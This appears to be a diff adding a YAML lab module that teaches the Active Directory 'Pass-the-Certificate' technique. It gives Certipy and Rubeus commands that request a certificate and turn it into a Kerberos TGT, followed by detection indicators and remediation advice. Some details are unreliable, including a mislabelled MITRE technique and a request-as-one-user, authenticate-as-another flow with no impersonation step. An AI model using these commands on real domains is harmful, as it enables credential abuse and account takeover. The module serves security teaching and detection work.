@@ -1,0 +1,97 @@
+# Category: Active Directory
+name: "Pass-the-Certificate – PKCS12 Authentication Abuse"
+id: "ad-pass-the-cert-001"
+category: "offensive_security"
+subcategory: "active_directory"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Extract a user's certificate (PFX) from Active Directory Certificate
+  Services and use it to authenticate to any service that accepts certificate
+  authentication (like LDAP over SSL, RDP with smartcard). This is similar
+  to Pass-the-Hash but for certificates.
+
+learning_objectives:
+  - Understand certificate authentication in AD
+  - Use Certipy or Rubeus to request a certificate
+  - Use the PFX to request a Kerberos TGT
+  - Authenticate to other services with the certificate
+
+tools:
+  - Certipy
+  - Rubeus
+  - OpenSSL
+  - PKINITtools
+
+prerequisites:
+  - ADCS environment
+  - User with enrollment rights
+  - A certificate template that allows client auth
+
+steps:
+  - id: "step1"
+    phase: "request"
+    action: "Request a certificate for a target user"
+    commands:
+      - "# Using Certipy"
+      - "certipy req -u user@domain -p password -ca CA-SERVER-CA -target ca.domain -template UserTemplate -out cert.pfx"
+    expected_output: "PFX certificate file"
+    detection: "CA logs show certificate request"
+
+  - id: "step2"
+    phase: "convert"
+    action: "Use certificate to get TGT"
+    commands:
+      - "# Using Rubeus"
+      - "Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /domain:domain.local /dc:dc.domain.local"
+    expected_output: "Kerberos TGT"
+    detection: "Kerberos logs (PKINIT)"
+
+  - id: "step3"
+    phase: "use"
+    action: "Use TGT to access resources"
+    commands:
+      - "# Use klist and then access SMB, LDAP"
+    expected_output: "Access as target user"
+    detection: "Unusual user activity"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Kerberos Tickets"
+  - standard: "NIST SP 800-53"
+    control: "IA-5"
+    description: "Authenticator Management"
+
+detection:
+  network_indicators:
+    - "PKINIT traffic (Kerberos with certificate)"
+  log_indicators:
+    - "Event 4768 (Kerberos TGT) with PKINIT options"
+  endpoint_indicators:
+    - "Certipy, Rubeus"
+
+remediation:
+  immediate:
+    - "Enforce strong certificate template policies (no client auth for low-priv users)"
+    - "Monitor for unusual certificate requests"
+  long_term:
+    - "Use certificate revocation lists"
+    - "Implement Microsoft's Certificate Lifecycle Management"
+
+variables:
+  user: "targetuser"
+  domain: "domain.local"
+  ca: "CA-SERVER-CA"
+
+assessment_questions:
+  - "How does certificate authentication work in Active Directory?"
+  - "What is PKINIT and how is it used for authentication?"
+  - "How can you detect Pass-the-Certificate attacks?"
+
+references:
+  - url: "https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf"
+    title: "Certified Pre-Owned"
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy"
